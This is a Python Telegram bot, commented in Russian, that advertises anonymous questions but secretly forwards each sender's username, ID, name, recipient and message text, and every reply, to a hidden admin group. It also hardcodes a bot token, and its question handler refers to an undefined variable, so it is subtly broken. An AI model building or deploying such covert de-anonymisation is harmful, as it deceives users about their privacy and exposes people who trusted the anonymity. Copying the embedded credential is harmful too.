import telebot
from telebot import types
import uuid
import sqlite3
from collections import defaultdict

TOKEN = '8430859086:AAEsdPIGXI-xG-6COFj48AUnU69yseZOnZo'  # Токен!
ADMIN_CHAT_ID = -1003267199569  # Ваша группа

bot = telebot.TeleBot(TOKEN)

conn = sqlite3.connect('anon_bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS sessions (link TEXT PRIMARY KEY, owner_id INTEGER)')
conn.commit()

pending_questions = {}  # q_id: sender_id

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    link = str(uuid.uuid4())
    cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (link, user_id))
    conn.commit()
    bot_username = bot.get_me().username
    share_link = f"https://t.me/{bot_username}?start={link}"
    bot.reply_to(message, f"🔗 Твоя ссылка для анонимных вопросов:\n<code>{share_link}</code>", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text.startswith('/start ') and len(m.text.split()) > 1)
def anon_question(message):
    _, link = m.text.split(maxsplit=1)
    cursor.execute("SELECT owner_id FROM sessions WHERE link=?", (link,))
    result = cursor.fetchone()
    if result:
        owner_id = result[0]
        if owner_id != message.from_user.id:
            q_id = str(uuid.uuid4())
            pending_questions[q_id] = message.from_user.id
            
            # Анонимно владельцу
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{q_id}"))
            bot.send_message(owner_id, f"❓ Анонимный вопрос:\n<code>{message.text}</code>", reply_markup=markup, parse_mode='HTML')
            
            # СКРЫТОЕ ДУБЛИРОВАНИЕ в админ группу
            sender_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
            sender_username = message.from_user.username or 'no_username'
            admin_log = f"""🕵️ НОВЫЙ ВОПРОС
👤 От: @{sender_username} ({message.from_user.id})
📛 Имя: {sender_name}
👥 Кому: {owner_id}
❓ Текст: {message.text}"""
            bot.send_message(ADMIN_CHAT_ID, admin_log, parse_mode='HTML')
            
            bot.reply_to(message, "✅ Вопрос отправлен анонимно!")
        else:
            bot.reply_to(message, "❌ Нельзя вопрос себе.")
    else:
        bot.reply_to(message, "❌ Неверная ссылка.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
def reply_menu(call):
    q_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id)
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
    bot.reply_to(call.message, f"💬 Ответьте (ID: {q_id}):")
    bot.register_next_step_handler(call.message, process_reply, q_id)

def process_reply(message, q_id):
    sender_id = pending_questions.get(q_id)
    if sender_id:
        bot.send_message(sender_id, f"📩 Ответ:\n{message.text}")
        bot.reply_to(message, "✅ Отправлено анонимно!")
        
        # Лог ответа в админ группу
        admin_reply_log = f"""📤 ОТВЕТ
🔄 На вопрос {q_id}
👤 От: {message.from_user.id}
👥 Кому: {sender_id}
💬 Текст: {message.text}"""
        bot.send_message(ADMIN_CHAT_ID, admin_reply_log, parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ Вопрос не найден.")

print("🚀 Бот запущен! Только ссылки + скрытое дублирование.")
bot.polling(none_stop=True)

